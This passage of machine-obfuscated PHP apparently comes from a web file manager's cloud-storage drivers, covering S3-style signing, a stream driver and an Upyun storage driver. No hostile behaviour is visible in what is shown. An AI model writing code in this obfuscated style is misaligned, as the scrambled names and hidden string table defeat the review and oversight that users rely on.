$áÁÈ´ì); } $‘şØ¹Ş¢ = array(); if (isset($áÁÈ´ì[$¿öôˆëî[1426]])) { $‘şØ¹Ş¢[$¿öôˆëî[1427]] = $áÁÈ´ì[$¿öôˆëî[1426]]; } $·äÍ¼Æş = explode($¿öôˆëî[186], $this->getHost()); $İ±çÚéç = array($¿öôˆëî[1428] => $·äÍ¼Æş[1], $¿öôˆëî[1429] => $¿öôˆëî[22], $¿öôˆëî[220] => $¿öôˆëî[128], $¿öôˆëî[1341] => $áÁÈ´ì[$¿öôˆëî[90]]); $¡Ë³å¹Û = $¿öôˆëî[233]; $ä¨­¥Ç = $¿öôˆëî[18] . $this->pathEncode($Ã‹¶Ë¸) . $Ç‡¿ËÚû; $™üû‰µ = $this->client->__getSignatureV4($‘şØ¹Ş¢, $İ±çÚéç, $¡Ë³å¹Û, $ä¨­¥Ç); if (strpos($Ç‡¿ËÚû, $¿öôˆëî[232]) === 0) { if (isset($‘şØ¹Ş¢[$¿öôˆëî[1427]])) { $Ñ¶Ìàõ‘ = $‘şØ¹Ş¢[$¿öôˆëî[1427]]; } else { if (isset($™üû‰µ[$¿öôˆëî[1427]])) { $Ñ¶Ìàõ‘ = $™üû‰µ[$¿öôˆëî[1427]]; } else { $Ñ¶Ìàõ‘ = hash($¿öôˆëî[1339], $¿öôˆëî[22]); } } return array($¿öôˆëî[238] => $™üû‰µ[$¿öôˆëî[238]], $¿öôˆëî[1427] => $Ñ¶Ìàõ‘, $¿öôˆëî[229] => $™üû‰µ[$¿öôˆëî[1430]]); } return $™üû‰µ[$¿öôˆëî[238]]; } public function listUploadParts($ºäşİå¡, $Õü•¨• = array()) { $¹Øæ»òÆ =& $_SERVER[¹àö™Ç¾]; $§šŞÊÜ¶ = str_replace($¹Øæ»òÆ[239], $¹Øæ»òÆ[22], $Õü•¨•[$¹Øæ»òÆ[177]]); $ºÓ¾®Æ„ = $this->client->listParts($this->bucket, $ºäşİå¡, $§šŞÊÜ¶); if (!$ºÓ¾®Æ„) { return !1; } $ĞÒÛğˆÁ = $¹Øæ»òÆ[1431]; foreach ($ºÓ¾®Æ„ as $ÅÖíàçä) { $ĞÒÛğˆÁ .= $¹Øæ»òÆ[1432] . "\74\120\141\x72\164\x4e\165\x6d\142\145\x72\76{$ÅÖíàçä[$¹Øæ»òÆ[1386]]}\74\x2f\120\141\162\x74\116\165\x6d\142\145\162\76\xa" . "\x3c\x45\x54\141\x67\x3e{$ÅÖíàçä[$¹Øæ»òÆ[1387]]}\x3c\x2f\105\x54\x61\147\x3e\12" . $¹Øæ»òÆ[1433]; } $ĞÒÛğˆÁ .= $¹Øæ»òÆ[1434]; $’îç–­æ = array(); $ù¡ñ¡ëÛ = explode($¹Øæ»òÆ[186], $this->getHost()); $ÊïÎ•è¿ = array($¹Øæ»òÆ[1428] => $ù¡ñ¡ëÛ[1], $¹Øæ»òÆ[220] => $¹Øæ»òÆ[128], $¹Øæ»òÆ[1341] => strlen($ĞÒÛğˆÁ)); $“·Õ«øì = $¹Øæ»òÆ[231]; $Î¾†Š÷Ÿ = $¹Øæ»òÆ[18] . $this->pathEncode($ºäşİå¡) . $Õü•¨•[$¹Øæ»òÆ[177]]; $òÎšã„õ = $this->client->__getSignatureV4($’îç–­æ, $ÊïÎ•è¿, $“·Õ«øì, $Î¾†Š÷Ÿ, $ĞÒÛğˆÁ); return array($¹Øæ»òÆ[238] => $òÎšã„õ[$¹Øæ»òÆ[238]], $¹Øæ»òÆ[229] => $òÎšã„õ[$¹Øæ»òÆ[1430]], $¹Øæ»òÆ[240] => $ºÓ¾®Æ„, $¹Øæ»òÆ[1427] => $òÎšã„õ[$¹Øæ»òÆ[1427]]); } public function link($£µÏ¬„ê, $Áï†Ù¾³ = array()) { return parent::link($£µÏ¬„ê, $Áï†Ù¾³); } public function fileOut($ã–¿ÖÏ°, $ïŸÆÉØÈ = false, $ÚÒÄÇÂ® = false, $ÈÙÍê‰‹ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹àö™Ç¾][1435])) { return parent::fileOutServer($ã–¿ÖÏ°, $ïŸÆÉØÈ, $ÚÒÄÇÂ®, $ÈÙÍê‰‹); } parent::fileOut($ã–¿ÖÏ°, $ïŸÆÉØÈ, $ÚÒÄÇÂ®, $ÈÙÍê‰‹); } public function fileOutImage($Ïª·¹Òï, $šÔ´’Íå = 250) { if (strstr($this->endpoint, $_SERVER[¹àö™Ç¾][1435])) { return parent::fileOutImageServer($Ïª·¹Òï, $šÔ´’Íå); } parent::fileOutImage($Ïª·¹Òï, $šÔ´’Íå); } public function fileOutLink($­äê–ò) { $ÉÆëş¥ =& $_SERVER[¹àö™Ç¾]; if (substr($­äê–ò, 0, 7) == $ÉÆëş¥[1308]) { $­äê–ò = $ÉÆëş¥[1309] . substr($­äê–ò, 7); } header($ÉÆëş¥[168] . $­äê–ò); die; } public function getHost() { $¾İÔÊ”Ù =& $_SERVER[¹àö™Ç¾]; $éáØ±öù = str_rtrim(parent::getHost(), $¾İÔÊ”Ù[18] . $this->bucket); $éáØ±öù = explode($¾İÔÊ”Ù[186], $éáØ±öù); return $éáØ±öù[0] . $¾İÔÊ”Ù[186] . $this->bucket . $¾İÔÊ”Ù[20] . $éáØ±öù[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($§ ÃÃ£, $óØç¦¹ = 0) { parent::__construct(); $this->source = $§ ÃÃ£; $this->sourceSize = $óØç¦¹; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($÷Ë¦¸éÍ = false) { return $this->sourceSize; } public function getContent($æÜàĞ¯ = false) { return $this->fileSubstr($æÜàĞ¯, 0, $this->sourceSize); } public function fileSubstr($¹çô©Í = false, $„ñí•’¾ = 0, $å—ëÁ¢€ = 0) { if (!$å—ëÁ¢€) { $å—ëÁ¢€ = $this->sourceSize; } $³ü­Ü†á = $this->sourceSize - $„ñí•’¾; if ($å—ëÁ¢€ >= $³ü­Ü†á) { $å—ëÁ¢€ = $³ü­Ü†á; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $„ñí•’¾, $å—ëÁ¢€); } if ($this->sourceType == self::TYPE_FILE) { if ($å—ëÁ¢€ <= 0) { return $_SERVER[¹àö™Ç¾][22]; } $ÛÍßı±È = ftell($this->source); fseek_64($this->source, $ÛÍßı±È + $„ñí•’¾); $‘¦ÀˆÆ = @fread($this->source, $å—ëÁ¢€); fseek_64($this->source, $ÛÍßı±È); return $‘¦ÀˆÆ; } } public function hashMd5($ÈİŒË‰‘ = false) { return md5($this->getContent()); } public static function hash($İ©’üÁ, $ÊÓœç’ß = 0) { $Ó¦éŸÖœ = new PathDriverStream($İ©’üÁ, $ÊÓœç’ß); return $Ó¦éŸÖœ->hashSimple($İ©’üÁ); } public static function md5($è¯÷Ï±Å, $à‚†–Ò = 0) { $¤ Œ¡ê§ = new PathDriverStream($è¯÷Ï±Å, $à‚†–Ò); return $¤ Œ¡ê§->hashMd5($è¯÷Ï±Å); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\72\x2f\x2f\x76\x30\x2e\141\160\151\x2e\165\x70\x79\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ıñœùØ) { parent::__construct(); $this->_init($ıñœùØ); } public function _init($Ş°­ÈìÊ) { $ºß€ŒªÑ =& $_SERVER[¹àö™Ç¾]; foreach ($Ş°­ÈìÊ as $Í°ğ€“ö => $Ë©Õ…Äå) { if (isset($this->{$Í°ğ€“ö})) { $this->{$Í°ğ€“ö} = $Ë©Õ…Äå; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ºß€ŒªÑ[1436] . LNG($ºß€ŒªÑ[1367])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($²¹Øá, $›à•øè¹ = "\107\x45\124") { $şŸ§’ =& $_SERVER[¹àö™Ç¾]; $Æ˜ÇÑüÖ = gmdate($şŸ§’[1400]); $Ä…ñÊ­ã = base64_encode(hash_hmac($şŸ§’[1437], "{$›à•øè¹}\x26{$²¹Øá}\46{$Æ˜ÇÑüÖ}", md5("{$this->userpass}"), !0)); $¡ÈËÙôµ = array("\101\x75\164\x68\157\162\151\172\141\x74\x69\157\x6e\72\x55\x50\131\125\x4e\x20{$this->username}\72{$Ä…ñÊ­ã}", "\x44\141\x74\x65\x3a{$Æ˜ÇÑüÖ}"); return $¡ÈËÙôµ; } public function ussRequest($Ş†²ÌÊä, $¨®¢Ã² = "\107\x45\124", $¦•óè¶ä = false, $ª«ùÓš´ = false, $åêâÎ¶š = false) { $öò…Ş“± =& $_SERVER[¹àö™Ç¾]; $Ş†²ÌÊä = trim($Ş†²ÌÊä, $öò…Ş“±[18]); $…‡´œÈ¾ = "\57{$this->bucket}\x2f{$Ş†²ÌÊä}"; $Õà»Š = $this->ussHeaders($…‡´œÈ¾, $¨®¢Ã²); if ($ª«ùÓš´) { $Õà»Š = array_merge($Õà»Š, $ª«ùÓš´); } $íê÷­¿ü = url_request($this->endpoint . $…‡´œÈ¾, $¨®¢Ã², $¦•óè¶ä, $Õà»Š, $åêâÎ¶š); if (!$íê÷­¿ü) { return array($öò…Ş“±[1174] => !1, $öò…Ş“±[1176] => $öò…Ş“±[1438]); } if (strtolower($¨®¢Ã²) == $öò…Ş“±[199] || in_array($íê÷­¿ü[$öò…Ş“±[1174]], array($öò…Ş“±[1293], $öò…Ş“±[1439]))) { $¦•óè¶ä = $íê÷­¿ü[$öò…Ş“±[1440]]; } else { $¦•óè¶ä = json_decode($íê÷­¿ü[$öò…Ş“±[1176]], !0); if (!$¦•óè¶ä) { $¦•óè¶ä = $íê÷­¿ü[$öò…Ş“±[1176]]; } else { if (!$íê÷­¿ü[$öò…Ş“±[742]] && isset($¦•óè¶ä[$öò…Ş“±[1441]])) { $¦•óè¶ä = $¦•óè¶ä[$öò…Ş“±[1441]]; } } } return array($öò…Ş“±[1174] => $íê÷­¿ü[$öò…Ş“±[742]], $öò…Ş“±[1176] => $¦•óè¶ä); } public function mkfile($Æë‘­ÊÔ, $çÍ¡Â°í = '', $İÙªëÛĞ = REPEAT_RENAME) { if ($this->setContent($Æë‘­ÊÔ, $çÍ¡Â°í)) { return $this->getPathOuter($Æë‘­ÊÔ); } return !1; } public function mkdir($¾›ğ¢Òæ, $úÔ—º¦ó = REPEAT_SKIP) { $å¡®ó´¨ =& $_SERVER[¹àö™Ç¾]; $˜ğñÒ˜Ÿ = trim($¾›ğ¢Òæ, $å¡®ó´¨[18]); if ($this->_isFolder($˜ğñÒ˜Ÿ)) { return $this->getPathOuter($˜ğñÒ˜Ÿ); } $ö¹ªÒÒØ = array($å¡®ó´¨[1442]); $™“Ì’Æ³ = $this->ussRequest($˜ğñÒ˜Ÿ, $å¡®ó´¨[231], !1, $ö¹ªÒÒØ); return $™“Ì’Æ³[$å¡®ó´¨[1174]] ? $this->getPathOuter($˜ğñÒ˜Ÿ) : !1; } public function copyFile($‡ÑÊşËœ, $›ÑÔÕè’) { $¼ù‘îñô =& $_SERVER[¹àö™Ç¾]; $ì ÍŸĞş = array($¼ù‘îñô[1443] . "\x2f{$this->bucket}\x2f{$‡ÑÊşËœ}", $¼ù‘îñô[1444]); $“ÕÜ“Ç¯ = $this->ussRequest($›ÑÔÕè’, $¼ù‘îñô[233], !1, $ì ÍŸĞş); return $“ÕÜ“Ç¯[$¼ù‘îñô[1174]] ? !0 : $this->getPathOuter($›ÑÔÕè’); } public function moveFile($ˆ¾ØŸÛ, $ïáÇÚÑ) { $òÙì„ç =& $_SERVER[¹àö™Ç¾]; $éÆ£ÌÇï = array($òÙì„ç[1445] . "\x2f{$this->bucket}\x2f{$ˆ¾ØŸÛ}", $òÙì„ç[1444]); $á•æë´ê = $this->ussRequest($ïáÇÚÑ, $òÙì„ç[233], !1, $éÆ£ÌÇï); return $á•æë´ê[$òÙì„ç[1174]] ? !0 : $this->getPathOuter($ïáÇÚÑ); } public function delFile($­ûÔ„ ²) { $¤ÚñÚï· =& $_SERVER[¹àö™Ç¾]; $ª¢Ì–¨ = $this->ussRequest($­ûÔ„ ², $¤ÚñÚï·[1446]); return $ª¢Ì–¨[$¤ÚñÚï·[1174]] ? !0 : !1; } public function delFolder($ãœˆ˜›š) { $ÑÖ–úÍ´ =& $_SERVER[¹àö™Ç¾]; if (!$this->exist($ãœˆ˜›š)) { return !0; } $this->listItemCache = !1; $–€©’º© = $Çõ´ÄïÃ = array(); $this->fileList($ãœˆ˜›š, $–€©’º©, $Çõ´ÄïÃ, !0); $this->listItemCache = !0; foreach ($Çõ´ÄïÃ as $•²•ŠÎ«) { $ÍÉéÑø = $this->ussRequest($•²•ŠÎ«[$ÑÖ–úÍ´[42]], $ÑÖ–úÍ´[1446]); if (!$ÍÉéÑø[$ÑÖ–úÍ´[1174]]) { return !1; } } foreach ($–€©’º© as $‚ ÍÍÒì) { $ÍÉéÑø = $this->ussRequest($‚ ÍÍÒì, $ÑÖ–úÍ´[1446]); if (!$ÍÉéÑø[$ÑÖ–úÍ´[1174]]) { return !1; } } $ÍÉéÑø = $this->ussRequest($ãœˆ˜›š, $ÑÖ–úÍ´[1446]); return $ÍÉéÑø[$ÑÖ–úÍ´[1174]]; } public function rename($¦ñã•©º, $§Ïı”ó¨) { if ($this->isFile($¦ñã•©º)) { $§Ïı”ó¨ = get_path_father($¦ñã•©º) . $§Ïı”ó¨; return $this->moveFile($¦ñã•©º, $§Ïı”ó¨); } return $this->renameObject($¦ñã•©º, $§Ïı”ó¨); } public function fileInfo($±Ò£†Î, $ì‹Í ı´ = false, $ˆœüªâ¾ = array()) { $ÚâÍŸç =& $_SERVER[¹àö™Ç¾]; $Í»úÃ—Ô = array($ÚâÍŸç[42] => $this->pathThis($±Ò£†Î), $ÚâÍŸç[88] => $this->getPathOuter($ÚâÍŸç[18] . $±Ò£†Î), $ÚâÍŸç[43] => $ÚâÍŸç[202], $ÚâÍŸç[90] => isset($ˆœüªâ¾[$ÚâÍŸç[90]]) ? $ˆœüªâ¾[$ÚâÍŸç[90]] : 0, $ÚâÍŸç[177] => $this->ext($±Ò£†Î)); if ($ì‹Í ı´) { return $Í»úÃ—Ô; } $Í»úÃ—Ô[$ÚâÍŸç[203]] = $Í»úÃ—Ô[$ÚâÍŸç[96]] = 0; $Í»úÃ—Ô[$ÚâÍŸç[204]] = $Í»úÃ—Ô[$ÚâÍŸç[205]] = !0; if (empty($ˆœüªâ¾)) { $ˆœüªâ¾ = $this->objectMeta($±Ò£†Î); if (!$ˆœüªâ¾) { return $Í»úÃ—Ô; } } $Í»úÃ—Ô[$ÚâÍŸç[203]] = intval($ˆœüªâ¾[$ÚâÍŸç[1447]]); $Í»úÃ—Ô[$ÚâÍŸç[96]] = intval($ˆœüªâ¾[$ÚâÍŸç[1448]]); $Í»úÃ—Ô[$ÚâÍŸç[90]] = $ˆœüªâ¾[$ÚâÍŸç[90]]; return $Í»úÃ—Ô; } public function folderInfo($‡¥ì£Ë, $óüæ¿˜ß = false) { $èÛÂ‘çø =& $_SERVER[¹àö™Ç¾]; $´õ“é†Ş = array($èÛÂ‘çø[42] => $this->pathThis($‡¥ì£Ë), $èÛÂ‘çø[88] => $this->getPathOuter($èÛÂ‘çø[18] . $‡¥ì£Ë), $èÛÂ‘çø[43] => $èÛÂ‘çø[89]); if ($óüæ¿˜ß) { return $´õ“é†Ş; } $´õ“é†Ş[$èÛÂ‘çø[203]] = $´õ“é†Ş[$èÛÂ‘çø[96]] = 0; $´õ“é†Ş[$èÛÂ‘çø[204]] = $´õ“é†Ş[$èÛÂ‘çø[205]] = !0; if (empty($µŠİ£Ï)) { $µŠİ£Ï = $this->objectMeta($‡¥ì£Ë); if (!$µŠİ£Ï) { return $´õ“é†Ş; } } $´õ“é†Ş[$èÛÂ‘çø[203]] = intval($µŠİ£Ï[$èÛÂ‘çø[1447]]); $´õ“é†Ş[$èÛÂ‘çø[96]] = intval($µŠİ£Ï[$èÛÂ‘çø[1448]]); return $´õ“é†Ş; } private function listObjs($¼±Š£©, $òä‹ò÷ = 0, $ÏğˆË¸å = 1000) { $ßÖ¸ªÍó =& $_SERVER[¹àö™Ç¾]; $¦™±‹®¯ = array($ßÖ¸ªÍó[1449], $ßÖ¸ªÍó[1450] . $ÏğˆË¸å); if ($òä‹ò÷) { $¦™±‹®¯[] = $ßÖ¸ªÍó[1451] . $òä‹ò÷; } $°êÌŒõÉ = $this->ussRequest($¼±Š£©, $ßÖ¸ªÍó[235], !1, $¦™±‹®¯); return !$°êÌŒõÉ[$ßÖ¸ªÍó[1174]] ? !1 : $°êÌŒõÉ[$ßÖ¸ªÍó[1176]]; } private function fileList($¯éÈ”Ê£, &$ûËøĞòğ, &$Öé›‚¯˜, $Ş©³İÌá = false) { $êÙúÔ¯ =& $_SERVER[¹àö™Ç¾]; $á°¥Ğ = $êÙúÔ¯[22]; $ñŞ¦ƒ£é = 1000; $¡è­ = rtrim($¯éÈ”Ê£, $êÙúÔ¯[18]) . $êÙúÔ¯[18]; $¯¥°ãïª = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $ÇÆüàÄ£ = $this->listObjs($¯éÈ”Ê£, $á°¥Ğ, $ñŞ¦ƒ£é); if (!$ÇÆüàÄ£) { return !1; } $á°¥Ğ = isset($ÇÆüàÄ£[$êÙúÔ¯[1452]]) ? $ÇÆüàÄ£[$êÙúÔ¯[1452]] : $êÙúÔ¯[22]; $ÔĞœÂÀ‡ = isset($ÇÆüàÄ£[$êÙúÔ¯[1453]]) ? $ÇÆüàÄ£[$êÙúÔ¯[1453]] : array(); foreach ($ÔĞœÂÀ‡ as $‰ıñ‚È) { $®¦ŠàÔ× = $‰ıñ‚È[$êÙúÔ¯[43]] == $êÙúÔ¯[89] ? !0 : !1; $²ƒ‡›Å¥ = ltrim($¡è­ . $‰ıñ‚È[$êÙúÔ¯[42]], $êÙúÔ¯[18]) . ($®¦ŠàÔ× ? $êÙúÔ¯[18] : $êÙúÔ¯[22]); $›õáíì = array($êÙúÔ¯[42] => $²ƒ‡›Å¥, $êÙúÔ¯[43] => $®¦ŠàÔ× ? $êÙúÔ¯[89] : $êÙúÔ¯[202], $êÙúÔ¯[90] => $‰ıñ‚È[$êÙúÔ¯[341]], $êÙúÔ¯[1448] => $‰ıñ‚È[$êÙúÔ¯[1454]]); if ($¯¥°ãïª) { $this->cacheMethod($êÙúÔ¯[208], $²ƒ‡›Å¥, $®¦ŠàÔ×); $this->cacheMethod($êÙúÔ¯[209], $²ƒ‡›Å¥, $›õáíì); } if ($®¦ŠàÔ×) { $ûËøĞòğ[] = $²ƒ‡›Å¥; if ($Ş©³İÌá) { $this->fileList($²ƒ‡›Å¥, $ûËøĞòğ, $Öé›‚¯˜, $Ş©³İÌá); } continue; } $Öé›‚¯˜[] = $›õáíì; } if (count($ÔĞœÂÀ‡) < $ñŞ¦ƒ£é) { break; } } if ($¯¥°ãïª) { $this->cacheMethod($êÙúÔ¯[208], $¯éÈ”Ê£, !0); } } public function listPath($´ªŒæ—ş, $øşàÖª = false) { $ëóÓÑ­ =& $_SERVER[¹àö™Ç¾]; $îÔËÊ´Á = $éƒÖù£‹ = array(); $this->fileList($´ªŒæ—ş, $îÔËÊ´Á, $éƒÖù£‹); foreach ($îÔËÊ´Á as $˜›º‘Ö¶ => $§Éã É†) { $îÔËÊ´Á[$˜›º‘Ö¶] = $this->folderInfo($§Éã É†, $øşàÖª); } foreach ($éƒÖù£‹ as $˜›º‘Ö¶ => $§Éã É†) { $éƒÖù£‹[$˜›º‘Ö¶] = $this->fileInfo($§Éã É†[$ëóÓÑ­[42]], $øşàÖª, $§Éã É†); } return array($ëóÓÑ­[87] => $îÔËÊ´Á, $ëóÓÑ­[86] => $éƒÖù£‹); } public function has($º½…°ó˜, $çéÓ­Ğö = false, $úÚ¨æ€ä = true) { $ò”™ï‹² =& $_SERVER[¹àö™Ç¾]; $¸ÔüºŞ™ = $ò”™ï‹²[22]; $ ¨úÄóˆ = 500; $ŒñòÄ§ = 0; $ã¡Øñ´Ï = 0; $²ëÕº– = rtrim($º½…°ó˜, $ò”™ï‹²[18]) . $ò”™ï‹²[18]; while (!0) { check_abort(); $Ä¸ÍÑı¤ = $this->listObjs($º½…°ó˜, $¸ÔüºŞ™, $ ¨úÄóˆ); if (!$Ä¸ÍÑı¤) { return !1; } $¸ÔüºŞ™ = isset($Ä¸ÍÑı¤[$ò”™ï‹²[1452]]) ? $Ä¸ÍÑı¤[$ò”™ï‹²[1452]] : $ò”™ï‹²[22]; $ãÎö’Ö– = isset($Ä¸ÍÑı¤[$ò”™ï‹²[1453]]) ? $Ä¸ÍÑı¤[$ò”™ï‹²[1453]] : array(); if (empty($ãÎö’Ö–)) { break; } $ÕÂºâªË = array_filter($ãÎö’Ö–, function ($¨”ˆù®¢) { $¾ç¦’é• =& $_SERVER[¹àö™Ç¾]; return $¨”ˆù®¢[$¾ç¦’é•[43]] == $¾ç¦’é•[89]; }); $ÙëÄì‡‰ = count($ãÎö’Ö–); $ÕÂºâªË = count($ÕÂºâªË); $ê‘Şİ¤ = $ÙëÄì‡‰ - $ÕÂºâªË; if ($çéÓ­Ğö) { $ã¡Øñ´Ï += $ÕÂºâªË; $ŒñòÄ§ += $ê‘Şİ¤; if ($ÙëÄì‡‰ < $ ¨úÄóˆ) { break; } continue; } if ($úÚ¨æ€ä) { if ($ê‘Şİ¤) { return !0; } } else { if ($ÕÂºâªË) { return !0; } } if ($ÙëÄì‡‰ < $ ¨úÄóˆ) { break; } } if ($çéÓ­Ğö) { return array($ò”™ï‹²[212] => $ŒñòÄ§, $ò”™ï‹²[213] => $ã¡Øñ´Ï); } return !1; } public function listAll($¦Ëñ¾) { $–±şÏ¢ù =& $_SERVER[¹àö™Ç¾]; $óÍª´·ú = $‘¨ì£™ = array(); $this->fileList($¦Ëñ¾, $óÍª´·ú, $‘¨ì£™, !0); $‚‡×ùÌç = array(); foreach ($‘¨ì£™ as $ÜÔæßï) { $‚‡×ùÌç[$ÜÔæßï[$–±şÏ¢ù[42]]] = $ÜÔæßï[$–±şÏ¢ù[90]]; } foreach ($óÍª´·ú as $ÜÔæßï) { if (is_string($ÜÔæßï)) { $‚‡×ùÌç[$ÜÔæßï] = 0; } } return $this->listAllFiles($¦Ëñ¾, array_keys($‚‡×ùÌç), $‚‡×ùÌç); } public function canRead($¦²ã¯¸”) { return $this->exist($¦²ã¯¸”) ? !0 : !1; } public function canWrite($ÑÍªæ) { return $this->exist($ÑÍªæ) ? !0 : !1; } public function getContent($áì ½Æ) { return $this->fileSubstr($áì ½Æ, 0, -1); } public function setContent($Ğ¢ï…Ù©, $Ûû›úï€ = '') { $°¿±‰±´ =& $_SERVER[¹àö™Ç¾]; if (!$Ûû›úï€) { $Ï…ÈÂ÷ö = $this->ussRequest($Ğ¢ï…Ù©, $°¿±‰±´[231]); return $Ï…ÈÂ÷ö[$°¿±‰±´[1174]]; } $†ıÀÇ¼Ï = $this->tempFile($this->pathThis($Ğ¢ï…Ù©)); file_put_contents($†ıÀÇ¼Ï, $Ûû›úï€); if ($this->upload($Ğ¢ï…Ù©, $†ıÀÇ¼Ï)) { $this->tempFileRemve($†ıÀÇ¼Ï); return !0; } return !1; } public function fileSubstr($üçßŞıƒ, $¡Õª¶å, $ôØšÙ×) { $×ÀëôÃ¾ =& $_SERVER[¹àö™Ç¾]; if (!($£Úùëª = $this->link($üçßŞıƒ))) { return !1; } $³Ç¯¨ë = !1; if ($ôØšÙ× > 0) { $¶ä ËÔÕ = $¡Õª¶å + $ôØšÙ× - 1; $³Ç¯¨ë = array($×ÀëôÃ¾[1415] . $¡Õª¶å . $×ÀëôÃ¾[460] . $¶ä ËÔÕ); } $‡—™‰—Ñ = url_request($£Úùëª, $×ÀëôÃ¾[235], !1, $³Ç¯¨ë); return $‡—™‰—Ñ[$×ÀëôÃ¾[742]] ? $‡—™‰—Ñ[$×ÀëôÃ¾[1176]] : !1; } public function upload($£‚‰ü½, $Ô¸Å‡‚§, $Å€‹‰… = false, $ÔÈê†Õ = REPEAT_REPLACE) { $Ş€è÷˜¿ =& $_SERVER[¹àö™Ç¾]; $‡ŞñÇ”¸ = IO::size($Ô¸Å‡‚§); if ($‡ŞñÇ”¸ <= 1024 * 1024 * 200) { $£ôûú = array($Ş€è÷˜¿[1455] . $Ô¸Å‡‚§); $¥¨Èç«‰ = $this->ussRequest($£‚‰ü½, $Ş€è÷˜¿[233], $£ôûú); return $¥¨Èç«‰[$Ş€è÷˜¿[1174]] ? $this->getPathOuter($£‚‰ü½) : !1; } $¨ƒñƒô— = 1024 * 1024 * 10; $·À§Õ˜– = array($Ş€è÷˜¿[1456], $Ş€è÷˜¿[1457] . $‡ŞñÇ”¸, $Ş€è÷˜¿[1458], $Ş€è÷˜¿[1459] . $¨ƒñƒô—); $¥¨Èç«‰ = $this->ussRequest($£‚‰ü½, $Ş€è÷˜¿[233], !1, $·À§Õ˜–); if (!$¥¨Èç«‰[$Ş€è÷˜¿[1174]]) { return !1; } $ÕÙ®—Ïª = $¥¨Èç«‰[$Ş€è÷˜¿[1176]]; $öôİé–” = 0; $Ï…¤ÆÂÂ = $ÕÙ®—Ïª[$Ş€è÷˜¿[1460]]; $‘²¼¼µ¶ = fopen($Ô¸Å‡‚§, $Ş€è÷˜¿[1364]); if (!$‘²¼¼µ¶) { return !1; } do { $»õ’­ºƒ = $ÕÙ®—Ïª[$Ş€è÷˜¿[1461]]; fseek_64($‘²¼¼µ¶, $öôİé–”); $í˜‘ˆøâ = fread($‘²¼¼µ¶, $»õ’­ºƒ); $«¿÷™º = 0; do { $«¿÷™º++; $ÕÙ®—Ïª = $this->uploadPart($£‚‰ü½, $ÕÙ®—Ïª, $í˜‘ˆøâ); } while (!$ÕÙ®—Ïª && $«¿÷™º < 3); if (!$ÕÙ®—Ïª) { return !1; } $Ï…¤ÆÂÂ = $ÕÙ®—Ïª[$Ş€è÷˜¿[1460]]; $öôİé–” += $»õ’­ºƒ; } while ($Ï…¤ÆÂÂ != -1); fclose($‘²¼¼µ¶); $·À§Õ˜– = array($Ş€è÷˜¿[1462], $Ş€è÷˜¿[1463] . $ÕÙ®—Ïª[$Ş€è÷˜¿[1464]], $Ş€è÷˜¿[1458]); $¥¨Èç«‰ = $this->ussRequest($£‚‰ü½, $Ş€è÷˜¿[233], !1, $·À§Õ˜–); return $¥¨Èç«‰[$Ş€è÷˜¿[1174]] ? $this->getPathOuter($öà²ÃƒÅ) : !1; } private function uploadPart($˜‚…ğÎ, $’¦òê”´, &$ˆ¦œˆâö) { $¾„Ö„êö =& $_SERVER[¹àö™Ç¾]; $ñìÂûÄ = array($¾„Ö„êö[1465], $¾„Ö„êö[1463] . $’¦òê”´[$¾„Ö„êö[1464]], $¾„Ö„êö[1466] . $’¦òê”´[$¾„Ö„êö[1460]], $¾„Ö„êö[149] . $’¦òê”´[$¾„Ö„êö[1461]]); $±É©”Œê = $this->ussRequest($˜‚…ğÎ, $¾„Ö„êö[233], $ˆ¦œˆâö, $ñìÂûÄ); return !$±É©”Œê[$¾„Ö„êö[1174]] ? $±É©”Œê[$¾„Ö„êö[1174]] : $±É©”Œê[$¾„Ö„êö[1176]]; } public function uploadFormData($Ò²Ô” , $–ß¶Ùü = 3600) { return $this->uploadPolicy($Ò²Ô” , $–ß¶Ùü); } public function multiUploadFormData($¼ÓúÏ½¿, $ÇùŒÆåû = 3600) { $Û´éôëÑ =& $_SERVER[¹àö™Ç¾]; $ĞŒûòõ = (int) $GLOBALS[$Û´éôëÑ[17]][$Û´éôëÑ[90]]; return $this->uploadPolicy($¼ÓúÏ½¿, $ÇùŒÆåû, $ĞŒûòõ); } private function uploadPolicy($€¹øóû, $ïÍËÓ—İ = 3600, $ßæÉğÓ = 0) { $éùà±Ï† =& $_SERVER[¹àö™Ç¾]; $ùæÛ‡¶× = $éùà±Ï†[18] . $this->bucket; $ÆéÔø¿ = gmdate($éùà±Ï†[1400]); $®ƒ™ÈêÇ = array($éùà±Ï†[1467] => $this->bucket, $éùà±Ï†[1468] => $€¹øóû, $éùà±Ï†[1469] => time() + $ïÍËÓ—İ, $éùà±Ï†[1470] => $ÆéÔø¿); if ($ßæÉğÓ) { $®ƒ™ÈêÇ[$éùà±Ï†[1380]] = $ßæÉğÓ; } $½×ú«¶Æ = base64_encode(json_encode($®ƒ™ÈêÇ)); $æê÷Ã“´ = base64_encode(hash_hmac($éùà±Ï†[1437], "\120\x4f\x53\124\46{$ùæÛ‡¶×}\46{$ÆéÔø¿}\x26{$½×ú«¶Æ}", md5("{$this->userpass}"), !0)); $Åú¥ÓÍÂ = array($éùà±Ï†[1305] => $½×ú«¶Æ, $éùà±Ï†[1471] => "\x55\x50\131\x55\116\x20{$this->username}\x3a{$æê÷Ã“´}", $éùà±Ï†[184] => $this->endpoint . $ùæÛ‡¶×); return $Åú¥ÓÍÂ; } public function download($äÚ‡‹™, $ÛÀööÀ‡) { $ö·ÕÖÜÚ = IO::getPathInner(IO::mkfile($ÛÀööÀ‡)); if (!($íÒ°ô€õ = $this->link($äÚ‡‹™))) { return !1; } $¾·øÏŒ¶ = 0; $¤´ãµ— = 1024 * 200; $–Œêù×÷ = fopen($ö·ÕÖÜÚ, $_SERVER[¹àö™Ç¾][1421]); while (!0) { $§–Ÿúƒğ = $this->fileSubstr($äÚ‡‹™, $¾·øÏŒ¶, 